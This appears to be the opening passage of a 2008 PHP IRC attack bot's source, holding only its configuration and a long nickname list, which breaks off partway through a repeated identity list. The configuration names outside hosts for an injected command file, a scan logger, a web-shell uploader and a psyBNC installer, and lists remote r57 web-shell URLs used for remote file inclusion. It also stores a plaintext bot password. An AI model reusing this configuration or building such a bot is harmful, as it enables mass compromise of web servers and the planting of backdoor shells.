<?php
/******************************************
/* PHP BOT                                *
/* By Van-Persie                           *
/* EDITING 2008                           *
/* #Dorayaki@ALLNET                   *
/******************************************
*/

$versi = "v1.7";
//Configuration
$channels = '#kota-blitar'; // channel 1
$changue = '#kota-blitar'; // channel 2
$showresponse = 0; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$debugmode = 0; //Mode Debug IRC
$spyscan = TRUE; //TRUE, Cari. FALSE, Diem.
$myinject = 'http://pakmin.yourfreehosting.net/perkakas/cmd.txt?';
if ($localtest != 1) {
$myid = 'http://uaedesign.com/config/idfx.txt?';
$mylogger = 'http://legalref.ru/cyberz/logs/fxscanlogger.php?';
$myshelluploader = 'http://brojolelle.org/bnc/cerewet.txt?';
$mypsyinstaller = 'http://legalref.ru/cyberz/installpsy.txt?';
$mytargetlog = 'http://legalref.ru/cyberz/logs/target.txt';
}
else {
$myid = 'http://localhost/toolz/id.txt?';
$mylogger = 'http://localhost/toolz/fxscanlogger.php?';
$myshelluploader = 'http://localhost/toolz/uploadshell.txt?';
$mypsyinstaller = 'http://localhost/toolz/installpsy.txt?';
$mytargetlog = 'http://localhost/toolz/target.txt';
}

//Daftar Trigger
$targetlist = array();
$targetok = array();
$gantilist = array(
'http://h1.ripway.com/bsnet/a.txt?',
'http://83.222.131.90/~legitimi/mybase/r57.txt?',
'http://politics.wwf.gr/help/css/faq.txt?',
'http://galee/preman/r57/shell?',
);
$scanlist = array('http','ftp','pass');
$ignorelist = array(
'.detik',
'/accesswatch-1.32/',
'/aws/',
'/bugtraq/',
'/count/full.php/',
'/details.html/',
'/errorlog/',
'/estadisticas/',
'/excelwriter/',
'/include-editfunc-inc-p',
'/index.php/topic',
'/log/files',
'/packetstormsecurity.org/',
'/phpmystats/',
'/phpmystats4/',
'/reports/log',
'/server_stats/',
'/stat/index.php',
'/statistik/',
'/stats.php/',
'/stats/',
'/summary/cgi.html/',
'/usage-reports/',
'/visitas.php/',
'/voyages',
'/webanalyse/',
'/webanalyse/',
'admin/stats',
'awstat.pl',
'awstats',
'busca_vulns.php',
'cgi-bin/robot.cgi?',
'cnn-news-usa.info',
'cybermessageboard.usanethosting.com',
'dealnews.com',
'doomain.info',
'groups.yahoo.com',
'hackjob.org',
'highlight=http',
'html/administrator',
'index.php?p=stat',
'linkmatrix.de',
'marcot.fr/voyages/',
'milw0rm.com',
'module=search&',
'msxml.excite.com',
'php?keywords',
'phpbbacademy.com',
'phptraffic/index.php',
'radio.allindo.net',

'server_stats/',
'siiggle.com',
'sitemap.xml/',
'sleepycode.com',
'startrekguide.com',
'statistik.php',
't_countpro.cgi?view',
'tcl.tk/status/',
'thedefaced.org',
'user_stat.php?',
'www.cduniverse.com',
'www.detik',
'www.easyportail.org',
'www.robotron.org',
'www.topcities.com',
);
//Nick Bot
$nicklist = array(
    "CageModel", 
    "CalmeCute",
    "CameSiniDonksay",
    "CamKuinirusak",
    "Canley",
    "Capanni",
    "Caperton",
    "Capocaccia",
    "Capodilupo", 
    "Cappuccio",
    "Capursi",
    "Caratozzolo",
    "Carayannopoulos",
    "Carlin",
    "Carlos",
    "Carlyle",
    "Carmichael", 
    "Caroti",
    "Carper",
    "Cartmill",
    "Cascio",
    "Case",
    "Caspar",
    "Castelda",
    "Cavanagh", 
    "Cavell",
    "Ceniceros",
    "Cerioli",
    "Chapman",
    "Charles",
    "Cheang",
    "Cherry",
    "Chervinsky", 
    "Chiassino",
    "Chien",
    "Childress",
    "Childs",
    "Chinipardaz",
    "Chinman",
    "Christenson",
    "Christian", 
    "Christiano",
    "Christie",
    "Christopher",
    "ChuPuZ",
    "Chupasko",
    "Church",
    "Ciampaglia",
    "Cicero", 
    "Cifarelli",
    "Claffey",
    "Clancy",
    "Clark",
    "Clement",
    "Clifton",
    "Clow",
    "Coblenz", 
    "Coito",
    "Coldren",
    "Colella",
    "Collard",
    "Collis",
    "Compton",
    "Compton",
    "Comstock",
    "Concino",
    "Condodina",
    "Connors",
    "Corey",
    "Cornish",
    "Cosmides",
    "Counter",
    "Coutaux", 
    "Crawford",
    "Crocker",
    "Croshaw",
    "Croxen",
    "Croxton",
    "Cui",
    "Currier",
    "Cutler",
    "Cvek",
    "Cyders",
    "daSilva",
    "Daldalian",
    "Daly",
    "D'Ambra",
    "Danieli",
    "Dante",
    "Dapice",
    "D'arcangelo",
    "Das",
    "Dasgupta",
    "Daskalu",
    "David",
    "Dawkins",
    "DeGennaro", 
    "DeLaPena",
    "del'Enclos",
    "deRousse",
    "Debroff",
    "Dees",
    "Defeciani",
    "Delattre",
    "Deleon-Rendon", 
    "Delger",
    "Dell'acqua",
    "Deming",
    "Dempster",
    "Demusz",
    "Denault",
    "Denham",
    "Denison", 
    "Desombre",
    "Deutsch",
    "D'fini",
    "Dicks",
    "Diefenbach",
    "Difabio",
    "Difronzo",
    "Dilworth", 
    "Dionysius",
    "Dirksen",
    "Dockery",
    "Doherty",
    "Donahue",
    "Donner",
    "Doonan",
    "Dore", 
    "Dorf",
    "Dosi",
    "Doty",
    "Doug",
    "Dowsland",
    "Drinker",
    "D'souza",
    "Duffin",
    "Durrett", 
    "Dussault",
    "Dwyer",
    "Eardley",
    "Ebeling",
    "Eckel",
    "Edley",
    "Edner",
    "Edward",
    "Eickenhorst", 
    "Eliasson",
    "Elmendorf",
    "Elmerick",
    "Elvis",
    "Encinas",
    "Enyeart",
    "Eppling",
    "Erbach", 
    "Erdman",
    "Erdos",
    "Erez",
    "Espinoza",
    "Estes",
    "Etter",
    "Euripides",
    "Everett",
    "Fabbris",
    "Fagan",
    "Faioes",
    "Falco-Acosta",
    "Falorsi",
    "Faris",
    "Farone",
    "Farren",
    "Fasso'",
    "Fates",
    "Feigenbaum",
    "Fejzo",
    "Feldman",
    "Fernald",
    "Fernandes",
    "Ferrante", 
    "Ferriell",
    "Feuer",
    "Fido",
    "Field",
    "Fink",
    "Finkelstein",
    "Finnegan",
    "Fiorina", 
    "Fisk",
    "Fitzmaurice",
    "Flier",
    "Flores",
    "Folks",
    "Forester",
    "Fortes",
    "Fortier",
    "Fossey", 
    "Fossi",
    "Francisco",
    "Franklin-Kenea",
    "Franz",
    "Frazier-Davis",
    "Freid",
    "Freundlich",
    "Fried", 
    "Friedland",
    "Frisken",
    "Frowiss",
    "Fryberger",
    "Frye",
    "Fujii-Abe",
    "Fuller",
    "Furth", 
    "Fusaro",
    "Gabrielli",
    "Gaggiotti",
    "Galeotti",
    "Galwey",
    "Gambini",
    "Gascaneld",
    "Garman", 
    "Garonna",
    "Geller",
    "Gemberling",
    "Georgi",
    "Gerrett",
    "Ghorai",
    "Gibbens",
    "Gibson", 
    "Gilbert",
    "Gili",
    "Gill",
    "Gillispie",
    "Gist",
    "Gleason",
    "Glegg",
    "Glendon",
    "Goldfarb", 
    "Goncalves",
    "Good",
    "Goodearl",
    "Goody",
    "Gozzi",
    "Gravell",
    "Greenberg",
    "Greenfeld", 
    "Griffiths",
    "Grigoletto",
    "Grummell",
    "Gruner",
    "Gruppe",
    "Guenthart",
    "Gunn",
    "Guo", 
    "Ha",
    "Haar",
    "Hackman",
    "Hackshaw",
    "Haley",
    "Halkias",
    "Hallowell",
    "Halpert",
    "Hambarzumjan",
    "Hamer",
    "Hammerness",
    "Hand",
    "Hanssen",
    "Harding",
    "Hargraves",
    "Harlow", 
    "Harrigan",
    "Hartman",
    "Hartmann",
    "Hartnett",
    "Harwell",
    "Haviaras",
    "Hawkes",
    "Hayes", 
    "Haynes",
    "Hazlewood",
    "Heermans",
    "Heft",
    "Heiland",
    "Hellman",
    "Hellmiss",
    "Helprin", 
    "Hemphill",
    "Henery",
    "Henrichs",
    "Hernandez",
    "Herrera",
    "Hester",
    "Heubert",
    "Heyeck", 
    "Himmelfarb",
    "Hind",
    "Hirst",
    "Hitchcock",
    "Hoang",
    "Hock",
    "Hoffer",
    "Hoffman",
    "Hokanson",
    "Hokoda",
    "Holmes",
    "Holoien",
    "Holter",
    "Holway",
    "Holzman",
    "Hooker",
    "Hopkins", 
    "Horsley",
    "Hoshida",
    "Hostage",
    "Hottle",
    "Howard",
    "Hoy",
    "Huey",
    "Huidekoper",
    "Hungerford",
    "Huntington",
    "Hupp",
    "Hurtubise",
    "Hutchings",
    "Hyde",
    "Iaquinta",
    "Ichikawa", 
    "Igarashi",
    "Inamura",
    "Inniss",
    "Isaac",
    "Isaievych",
    "Isbill",
    "Isserman",
    "Iyer", 
    "Jacenko",
    "Jackson",
    "Jagers",
    "Jagger",
    "Jagoe",
    "Jain",
    "Jamil",
    "Janjigian",
    "Jarnagin",
    "Jarrell",
    "Jay",
    "Jeffers",
    "Jellis",
    "Jenkins",
    "Jespersen",
    "Jewett",
    "Johannesson",
    "Johannsen",
    "Johns",
    "Jolly",
    "Jorgensen",
    "Jucks",
    "Juliano",
    "Julious", 
    "Kabbash",
    "Kaboolian",
    "Kafadar",
    "Kalbfleisch",
    "Kaligian",
    "Kalil",
    "Kalinowski",
    "Kalman", 
    "Kamel",
    "Kangis",
    "Karpouzes",
    "Kassower",
    "Kasten",
    "Kawachi",
    "Kee",
    "Keenan",
    "Keepper",
    "Keith",
    "Kelker",
    "Kelsey",
    "Kempton",
    "Kemsley",
    "Kendall",
    "Kerry",
    "Keul", 
    "Khong",
    "Kimmel",
    "Kimmett",
    "Kimura",
    "Kindall",
    "Kinsley",
    "Kippenberger",
    "Kirscht", 
    "Kittridge",
    "Kleckner",
    "Kleiman",
    "Kleinfelder",
    "Klemperer",
    "Kling",
    "Klinkenborg",
    "Klint", 
    "Knuff",
    "Kobrick",
    "Koch",
    "Kohn",
    "Koivumaki",
    "Kommer",
    "Koniaris",
    "Konrad",
    "Kool",
    "Korzybski",
    "Kotter",
    "Kovaks",
    "Kraemer",
    "Krailo",
    "Krasney",
    "Kraus",
    "Kroemer", 
    "Krysiak",
    "Kuenzli",
    "Kumar",
    "Kusman",
    "Kuwabara",
    "La",
    "Labunka",
    "Lafler",
    "Laing", 
    "Lallemant",
    "Landes",
    "Lankes",
    "Lantieri",
    "Lanzit",
    "Laserna",
    "Lashley",
    "Lawless", 
    "Lecar",
    "Lecce",
    "Leclercq",
    "Leite",
    "Lenard",
    "l'Enclos",
    "Lesser",
    "Lessi", 
    "Liakos",
    "Lidano",
    "Liem",
    "Light",
    "Lightfoot",
    "Lim",
    "Linares",
    "Linda",
    "Linder", 
    "Line",
    "Linehan",
    "Linzee",
    "Lippmann",
    "Lipponen",
    "Little",
    "Litvak",
    "Livernash", 
    "Livi",
    "Livolsi",
    "Lizardo",
    "Locatelli",
    "Longworth",
    "Lossthelok",
    "Loveman",
    "Lowenstein", 
    "Lozak",
    "Lubin",
    "Lucas",
    "Luciano",
    "Luczkow",
    "Luecke",
    "Lunetta",
    "Luoma",
    "Lussier", 
    "Lutcavage",
    "Luzader",
    "MaSakSendiri",
    "Maccormac",
    "Macdonald",
    "Maceachern",
    "Macintyre",
    "Mackenney", 
    "MacMillan",
    "Macyh",
    "Madigan",
    "Maggio",
    "Mahony",
    "Maier",
    "Maine-Hershey",
    "Maisano", 
    "Malatesta",
    "Maller",
    "Malova",
    "Manalis",
    "Mandel",
    "Manganiello",
    "Mantovan",
    "March", 
    "Marchbanks",
    "Marcus",
    "Margalit",
    "Margetts",
    "Marques",
    "Martinez",
    "Martochio",
    "Marton", 
    "Marubini",
    "Massih",
    "Matalka",
    "Matarazzo",
    "Matsukata",
    "Mattson",
    "Mauzy",
    "Maysaro", 
    "Mazzali",
    "Mazziotta",
    "Mcbride",
    "Mccaffery",
    "Mccall",
    "Mcclearn",
    "Mcdowell",
    "Mcelroy", 
    "McFadden",
    "Mcghee",
    "Mcgoldrick",
    "McIlroy",
    "Mcintosh",
    "Mckenna",
    "Mclane",
    "Mclaren", 
    "Mcnealy",
    "Mcnulty",
    "Meccariello",
    "Memisoglu",
    "Menzies",
    "Merikoski",
    "Merlani",
    "Merminod", 
    "Merseth",
    "Merz",
    "Metelka",
    "Metropolis",
    "Meurer",
    "Michelman",
    "Middle",
    "Mieher", 
    "Mills",
    "Minh",
    "Mini",
    "Minichiello",
    "Gonzalez",
    "Mitropoulos",
    "Mittal",
    "Mocroft", 
    "Modestino",
    "Moeller",
    "Mohr",
    "Moiamedi",
    "Monque",
    "Montilio",
    "MooreDeCh.",
    "Morani", 
    "Moreton",
    "Morrison",
    "Morrow",
    "Mortimer",
    "Mosher",
    "Mosler",
    "Mostafavi",
    "Motooka", 
    "Mudarri",
    "Muello",
    "Mugnai",
    "Mulkern",
    "Mulroy",
    "Mumford",
    "Mussachio",
    "Naddeo", 
    "Napolitano",
    "Nardi",
    "Nardone",
    "Naviaux",
    "Nayduch",
    "Nelson",
    "Nenna",
    "Nesci", 
    "Neuman",
    "Newfeld",
    "Newlin",
    "Ng",
    "Ni",
    "Nickerson",
    "Nickoloff",
    "Nisenson",
    "Nitabach", 
    "Notman",
    "Nuzum",
    "Ocougne",
    "Ogata",
    "Oh",
    "O'hagan",
    "Oldford",
    "Olsen",
    "Olson", 
    "Olszewski",
    "O'malley",
    "Oman",
    "O'meara",
    "Opel",
    "Oray",
    "Oscaneld",
    "Orsi", 
    "Ospina",
    "Ostrowski",
    "Ottaviani",
    "Otten",
    "Ouchida",
    "Ovid",
    "PaesDealmeida",
    "Paine", 
    "Palayoor",
    "Palepu",
    "Pallara",
    "Palmitesta",
    "Panadero",
    "Panizzon",
    "Pantilla",
    "Paoletti", 
    "Parmeggiani",
    "Parris",
    "Partridge",
    "Pascucci",
    "Patefield",
    "Patrick",
    "Pattullo",
    "Pavetti", 
    "Pavlon",
    "Pawloski",
    "Paynter",
    "Peabody",
    "Pearlberg",
    "Pederson",
    "Peishel",
    "Penny", 
    "Pereira",
    "Perko",
    "Perlak",
    "Perlman",
    "Perna",
    "Perone",
    "Perrimon",
    "Peters",
    "Petruzello",
    "Pettibone",
    "Pettit",
    "Pfister",
    "Pilbeam",
    "Pinot",
    "Plancon",
    "Plant", 
    "Plasket",
    "Plous",
    "Pohh",
    "Pocobene",
    "Poincaire",
    "Pointer",
    "Poirier",
    "Polak",
    "Polanyi", 
    "Politis",
    "Poma",
    "Poolman",
    "Powers",
    "Presper",
    "Preucel",
    "Prevost",
    "Pritchard", 
    "Pritz",
    "Proietti",
    "Prothrow-Stith",
    "Puccia",
    "Pugh",
    "Pynchon",
    "Quaday",
    "Quetin", 
    "Rabe",
    "Rabkin",
    "Radeke",
    "Rajagopalan",
    "Raney",
    "Rangan",
    "Rankin",
    "Rapple",
    "Rayport",
    "Redden-Tyler",
    "Reedquist",
    "Cunningham",
    "Reinold",
    "Remak",
    "Renick",
    "Repetto", 
    "Resnik",
    "Rhea",
    "Richmond",
    "Rielly",
    "Rindos",
    "Rineer",
    "Rish",
    "Rivera",
    "Robinson", 
    "Rocha",
    "Roesler",
    "Rogers",
    "Ronen",
    "Row",
    "Roby",
    "Robert",
    "Royal",
    "Ru",
    "Ruan",
    "Ruderman",
    "Ruescher",
    "Rush",
    "Ryu",
    "Sabatello",
    "Sadler",
    "Safire", 
    "Sahu",
    "Sali",
    "Samson",
    "Sanchez-Ramirez",
    "Sanna",
    "Sapers",
    "Sarin",
    "Sartore", 
    "Sase",
    "Satin",
    "Satta",
    "Satterthwaite",
    "Sawtell",
    "Sayied",
    "Scarponi",
    "Scepan",
    "Scharf",
    "Scharlemann",
    "Scheiner",
    "Schiano",
    "Schifini",
    "Schilling",
    "Schmitt",
    "Schossberger", 
    "Schuman",
    "Schutte",

    "Schuyler",
    "Schwan",
    "Schwickrath",
    "Scovel",
    "Scudder",
    "Seaton", 
    "Seeber",
    "Segal",
    "Sekler",
    "Selvage",
    "Sen",
    "Sennett",
    "Seterdahl",
    "Sexton",
    "Seyfert",
    "Shaikh",
    "Shakis",
    "Shankland",
    "Shanley",
    "Shar",
    "Shatrov",
    "Shavelson",
    "Shea",
    "Sheats",
    "Shepherd",
    "Sheppard",
    "Shepstone",
    "Shesko",
    "Shia",
    "Shibata",
    "Shimon", 
    "Siesto",
    "Sigalot",
    "Sigini",
    "Signa",
    "Silverman",
    "Silvetti",
    "Sinsabaugh",
    "Sirilli", 
    "Sites",
    "Skane",
    "Skerry",
    "Skoda",
    "Sloan",
    "Slowe",
    "Smilow",
    "Sniffen",
    "Snodgrass", 
    "Socolow",
    "Solon",
    "Somers",
    "Sommariva",
    "Sorabella",
    "Sorg",
    "Sottak",
    "Soukup", 
    "Soule",
    "Soultanian",
    "Spanier",
    "Sparrow",
    "Spaulding",
    "Speizer",
    "Spence",
    "Sperber", 
    "Spicer",
    "Spiegelhalter",
    "Spiliotis",
    "Spinrad",
    "StMartin",
    "Stalvey",
    "Stam",
    "Stang", 
    "Stassinopolus",
    "States",
    "Statlender",
    "Stefani",
    "Steiner",
    "Stephanian",
    "Stepniewska",
    "Stewart-Oaten", 
    "Stiepock",
    "Stillwell",
    "Stock",
    "Stockton",
    "Stockwell",
    "Stolzenberg",
    "Stonich",
    "Storer", 
    "Stott",
    "Strange",
    "Strauch",
    "Streiff",
    "Stringer",
    "Sullivan",
    "Sumner",
    "Suo",
    "Surdam",
    "Sweeting",
    "Sweetser",
    "Swindle",
    "Tagiuri",
    "Tai",
    "Talaugon",
    "Tambiah",
    "Tandler",
    "Tanowitz",
    "Tatar",
    "Taveras",
    "Tawn",
    "Tcherepnin",
    "Teague",
    "Temes",
    "Temmer", 
    "Tenney",
    "Terracini",
    "Than",
    "Thavaneswaran",
    "Theodos",
    "Thibault",
    "Thisted",
    "Thomsen", 
    "Throop",
    "Tierney",
    "Till",
    "Timmons",
    "Tofallis",
    "Tollestrup",
    "Tolls",
    "Tolman", 
    "Tomford",
    "Toomer",
    "Topulos",
    "Torresi",
    "Torske",
    "Towler",
    "Toye",
    "Traebert",
    "Trenga",
    "Trewin",
    "Tringali",
    "Troiani",
    "Troy",
    "Truss",
    "Tsiatis",
    "Tsomides",
    "Tsukurov", 
    "Tuck",
    "Tudge",
    "Tukan",
    "Turano",
    "Turek",
    "Tuttle",
    "Twells",
    "Tzamarias",
    "Ullman", 
    "Untermeyer",
    "Upsdell",
    "Urban",
    "Urdang-Brown",
    "Usdan",
    "Uzuner",
    "Vacca",
    "Waite", 
    "Valberg",
    "Valencia",
    "Wales",
    "Wallenberg",
    "Walter",
    "vanAllen",
    "VanZwet",
    "Vandenberg", 
    "Vanheeckeren",
    "Warshafsky",
    "Wasowska",
    "Vasquez",
    "Waugh",
    "Weighart",
    "Weingarten",
    "Weinhaus", 
    "Weissbourd",
    "Weissman",
    "Velasquez",
    "Welles",
    "Welsh",
    "Wengret",
    "Venne",
    "Verghese", 
    "Wescott",
    "Wetzel",
    "Whately",
    "Whilton",
    "White",
    "Whitla",
    "Whittaker",
    "Viana", 
    "Viano",
    "Wiedersheim",
    "Wiener",
    "Viens",
    "Vignola",
    "Wilder",
    "Wilhelm",
    "Wilk",
    "Wilkin", 
    "Wilkinson",
    "Villarreal",
    "Willstatter",
    "Wilson",
    "Vitali",
    "Viviani",
    "Voigt",
    "Wolk", 
    "VonHoffman",
    "Woo",
    "Wooden",
    "Woods",
    "Woods-Powell",
    "Vorhaus",
    "Votey",
    "Vortex",
    "xixet",
    "xman",
    "Yacono", 
    "Yamane",
    "Yankee",
    "Yarchuk",
    "Yates",
    "Ybarra",
    "Yedidia",
    "Yesson",
    "Yetiv",
    "Yoffe", 
    "Yoo",
    "Youk-See",
    "Yu",
    "Zachary",
    "Zahedi",
    "Zangwill",
    "Zegans",
    "Zerbini",
    "Zoldak", 
    "DeFaCE`",
    "XuMblieR"
);
$identify = "password"; //Password Nick Bot
$identlist = array(
"CageModel", 
    "CalmeCute",
    "CameSiniDonksay",
    "CamKuinirusak",
    "Canley",
    "Capanni",
    "Caperton",
    "Capocaccia",
    "Capodilupo", 
    "Cappuccio",
    "Capursi",
    "Caratozzolo",
    "Carayannopoulos",
    "Carlin",
    "Carlos",
    "Carlyle",
    "Carmichael", 
    "Caroti",
    "Carper",
    "Cartmill",
    "Cascio",
    "Case",
    "Caspar",
    "Castelda",
    "Cavanagh", 
    "Cavell",
    "Ceniceros",
    "Cerioli",
    "Chapman",
    "Charles",
    "Cheang",
    "Cherry",
    "Chervinsky", 
    "Chiassino",
    "Chien",
    "Childress",
    "Childs",
    "Chinipardaz",
    "Chinman",
    "Christenson",
    "Christian", 
    "Christiano",
    "Christie",
    "Christopher",
    "ChuPuZ",
    "Chupasko",
    "Church",
    "Ciampaglia",
    "Cicero", 
    "Cifarelli",
    "Claffey",
    "Clancy",
    "Clark",
    "Clement",
    "Clifton",
    "Clow",
    "Coblenz", 
    "Coito",
    "Coldren",
    "Colella",
    "Collard",
    "Collis",
    "Compton",
    "Compton",
    "Comstock",
    "Concino",
    "Condodina",
    "Connors",
    "Corey",
    "Cornish",
    "Cosmides",
    "Counter",
    "Coutaux", 
    "Crawford",
    "Crocker",
    "Croshaw",
    "Croxen",
    "Croxton",
    "Cui",
    "Currier",
    "Cutler",
    "Cvek",
    "Cyders",
    "daSilva",
    "Daldalian",
    "Daly",
    "D'Ambra",
    "Danieli",
    "Dante",
    "Dapice",
    "D'arcangelo",
    "Das",
    "Dasgupta",
    "Daskalu",
    "David",
    "Dawkins",
    "DeGennaro", 
    "DeLaPena",
    "del'Enclos",
    "deRousse",
    "Debroff",
    "Dees",
    "Defeciani",
    "Delattre",
    "Deleon-Rendon", 
    "Delger",
    "Dell'acqua",
    "Deming",
    "Dempster",
    "Demusz",
    "Denault",
    "Denham",
    "Denison", 
    "Desombre",
    "Deutsch",
    "D'fini",
    "Dicks",
    "Diefenbach",
    "Difabio",
    "Difronzo",
    "Dilworth", 
    "Dionysius",
    "Dirksen",
    "Dockery",
    "Doherty",
    "Donahue",
    "Donner",
    "Doonan",
    "Dore", 
    "Dorf",
    "Dosi",
    "Doty",
    "Doug",
    "Dowsland",
    "Drinker",
    "D'souza",
    "Duffin",
    "Durrett", 
    "Dussault",
    "Dwyer",
    "Eardley",
    "Ebeling",
    "Eckel",
    "Edley",
    "Edner",
    "Edward",
    "Eickenhorst", 
    "Eliasson",
    "Elmendorf",
    "Elmerick",
    "Elvis",
    "Encinas",
    "Enyeart",
    "Eppling",
    "Erbach", 
    "Erdman",
    "Erdos",
    "Erez",
    "Espinoza",
    "Estes",
    "Etter",
    "Euripides",
    "Everett",
    "Fabbris",
    "Fagan",
    "Faioes",
    "Falco-Acosta",
    "Falorsi",
    "Faris",
    "Farone",
    "Farren",
    "Fasso'",
    "Fates",
    "Feigenbaum",
    "Fejzo",
    "Feldman",
    "Fernald",
    "Fernandes",
    "Ferrante", 
    "Ferriell",
    "Feuer",
    "Fido",
    "Field",
    "Fink",
    "Finkelstein",
    "Finnegan",
    "Fiorina", 
    "Fisk",
    "Fitzmaurice",
    "Flier",
    "Flores",
    "Folks",
    "Forester",
    "Fortes",
    "Fortier",
    "Fossey", 
    "Fossi",
    "Francisco",
    "Franklin-Kenea",
    "Franz",
    "Frazier-Davis",
    "Freid",
    "Freundlich",
    "Fried", 
    "Friedland",
    "Frisken",
    "Frowiss",
    "Fryberger",
    "Frye",
    "Fujii-Abe",
    "Fuller",
    "Furth", 
    "Fusaro",
    "Gabrielli",
    "Gaggiotti",
    "Galeotti",
    "Galwey",
    "Gambini",
    "Gascaneld",
    "Garman", 
    "Garonna",
    "Geller",
    "Gemberling",
    "Georgi",
    "Gerrett",
    "Ghorai",
    "Gibbens",
    "Gibson", 
    "Gilbert",
    "Gili",
    "Gill",
    "Gillispie",
    "Gist",
    "Gleason",
    "Glegg",
    "Glendon",
    "Goldfarb", 
    "Goncalves",
    "Good",
    "Goodearl",
    "Goody",
    "Gozzi",
    "Gravell",
    "Greenberg",
    "Greenfeld", 
    "Griffiths",
    "Grigoletto",
    "Grummell",
    "Gruner",
    "Gruppe",
    "Guenthart",
    "Gunn",
    "Guo", 
    "Ha",
    "Haar",
    "Hackman",
    "Hackshaw",
    "Haley",
    "Halkias",
    "Hallowell",
    "Halpert",
    "Hambarzumjan",
    "Hamer",
    "Hammerness",
    "Hand",
    "Hanssen",
    "Harding",
    "Hargraves",
    "Harlow", 
    "Harrigan",
    "Hartman",
    "Hartmann",
    "Hartnett",
    "Harwell",
    "Haviaras",
    "Hawkes",
    "Hayes", 
    "Haynes",
    "Hazlewood",
    "Heermans",
    "Heft",
    "Heiland",
    "Hellman",
    "Hellmiss",
    "Helprin", 
    "Hemphill",
    "Henery",
    "Henrichs",
    "Hernandez",
    "Herrera",
    "Hester",
    "Heubert",
    "Heyeck", 
    "Himmelfarb",
    "Hind",
    "Hirst",
    "Hitchcock",
    "Hoang",
    "Hock",
    "Hoffer",
    "Hoffman",
    "Hokanson",
    "Hokoda",
    "Holmes",
    "Holoien",
    "Holter",
    "Holway",
    "Holzman",
    "Hooker",
    "Hopkins", 
    "Horsley",
    "Hoshida",
    "Hostage",
    "Hottle",
    "Howard",
    "Hoy",
    "Huey",
    "Huidekoper",
    "Hungerford",
    "Huntington",
    "Hupp",
    "Hurtubise",
    "Hutchings",
    "Hyde",
    "Iaquinta",
    "Ichikawa", 
    "Igarashi",
    "Inamura",
    "Inniss",
    "Isaac",
    "Isaievych",
    "Isbill",
    "Isserman",
    "Iyer", 
    "Jacenko",
    "Jackson",
    "Jagers",
    "Jagger",
    "Jagoe",
    "Jain",
    "Jamil",
    "Janjigian",
    "Jarnagin",
    "Jarrell",
    "Jay",
    "Jeffers",
    "Jellis",
    "Jenkins",
    "Jespersen",
    "Jewett",
    "Johannesson",
    "Johannsen",
    "Johns",
    "Jolly",
    "Jorgensen",
    "Jucks",
    "Juliano",
    "Julious", 
    "Kabbash",
    "Kaboolian",
    "Kafadar",
    "Kalbfleisch",
    "Kaligian",
    "Kalil",
    "Kalinowski",
    "Kalman", 
    "Kamel",
    "Kangis",
    "Karpouzes",
    "Kassower",
    "Kasten",
    "Kawachi",
    "Kee",
    "Keenan",
    "Keepper",
    "Keith",
    "Kelker",
    "Kelsey",
    "Kempton",
    "Kemsley",
    "Kendall",
    "Kerry",
    "Keul", 
    "Khong",
    "Kimmel",
    "Kimmett",
    "Kimura",
    "Kindall",
    "Kinsley",
    "Kippenberger",
    "Kirscht", 
    "Kittridge",
    "Kleckner",
    "Kleiman",
    "Kleinfelder",
    "Klemperer",
    "Kling",
    "Klinkenborg",
    "Klint", 
    "Knuff",
    "Kobrick",
    "Koch",
    "Kohn",
    "Koivumaki",
    "Kommer",
    "Koniaris",
    "Konrad",
    "Kool",
    "Korzybski",
    "Kotter",
    "Kovaks",
    "Kraemer",
    "Krailo",
    "Krasney",
    "Kraus",
    "Kroemer", 
    "Krysiak",
    "Kuenzli",
    "Kumar",
    "Kusman",
    "Kuwabara",
    "La",
    "Labunka",
    "Lafler",
    "Laing", 
    "Lallemant",
    "Landes",
    "Lankes",
    "Lantieri",
    "Lanzit",
    "Laserna",
    "Lashley",
    "Lawless", 
    "Lecar",
    "Lecce",
    "Leclercq",
    "Leite",
    "Lenard",
    "l'Enclos",
    "Lesser",
    "Lessi", 
    "Liakos",
    "Lidano",
    "Liem",
    "Light",
    "Lightfoot",
    "Lim",
    "Linares",
    "Linda",
    "Linder", 
    "Line",
    "Linehan",
    "Linzee",
    "Lippmann",
    "Lipponen",
    "Little",
    "Litvak",
    "Livernash", 
    "Livi",
    "Livolsi",
    "Lizardo",
    "Locatelli",
    "Longworth",
    "Lossthelok",
    "Loveman",
    "Lowenstein", 
    "Lozak",
    "Lubin",
    "Lucas",
    "Luciano",
    "Luczkow",
    "Luecke",
    "Lunetta",
    "Luoma",
    "Lussier", 
    "Lutcavage",
    "Luzader",
    "MaSakSendiri",
    "Maccormac",
    "Macdonald",
    "Maceachern",
    "Macintyre",
    "Mackenney", 
    "MacMillan",
    "Macyh",
    "Madigan",
    "Maggio",
    "Mahony",
    "Maier",
    "Maine-Hershey",
    "Maisano", 
    "Malatesta",
    "Maller",
    "Malova",
    "Manalis",
    "Mandel",
    "Manganiello",
    "Mantovan",
    "March", 
    "Marchbanks",
    "Marcus",
    "Margalit",
    "Margetts",
    "Marques",
    "Martinez",
    "Martochio",
    "Marton", 
    "Marubini",
    "Massih",
    "Matalka",
    "Matarazzo",
    "Matsukata",
    "Mattson",
    "Mauzy",
    "Maysaro", 
    "Mazzali",
    "Mazziotta",
    "Mcbride",
    "Mccaffery",
    "Mccall",
    "Mcclearn",
    "Mcdowell",
    "Mcelroy", 
    "McFadden",
    "Mcghee",
    "Mcgoldrick",
    "McIlroy",
    "Mcintosh",
    "Mckenna",
    "Mclane",
    "Mclaren", 
    "Mcnealy",
    "Mcnulty",
    "Meccariello",
    "Memisoglu",
    "Menzies",
    "Merikoski",
    "Merlani",
    "Merminod", 
    "Merseth",
    "Merz",
    "Metelka",
    "Metropolis",
    "Meurer",
    "Michelman",
    "Middle",
    "Mieher", 
    "Mills",
    "Minh",
    "Mini",
    "Minichiello",
    "Gonzalez",
    "Mitropoulos",
    "Mittal",
    "Mocroft", 
    "Modestino",
    "Moeller",
    "Mohr",
    "Moiamedi",
    "Monque",
    "Montilio",
    "MooreDeCh.",
    "Morani", 
    "Moreton",
    "Morrison",
    "Morrow",
    "Mortimer",
    "Mosher",
    "Mosler",
    "Mostafavi",
    "Motooka", 
    "Mudarri",
    "Muello",
    "Mugnai",
    "Mulkern",
    "Mulroy",
    "Mumford",
    "Mussachio",
    "Naddeo", 
    "Napolitano",
    "Nardi",
    "Nardone",
    "Naviaux",
    "Nayduch",
    "Nelson",
    "Nenna",
    "Nesci", 
    "Neuman",
    "Newfeld",
    "Newlin",
    "Ng",
    "Ni",
    "Nickerson",
    "Nickoloff",
    "Nisenson",
    "Nitabach", 
    "Notman",
    "Nuzum",
    "Ocougne",
    "Ogata",
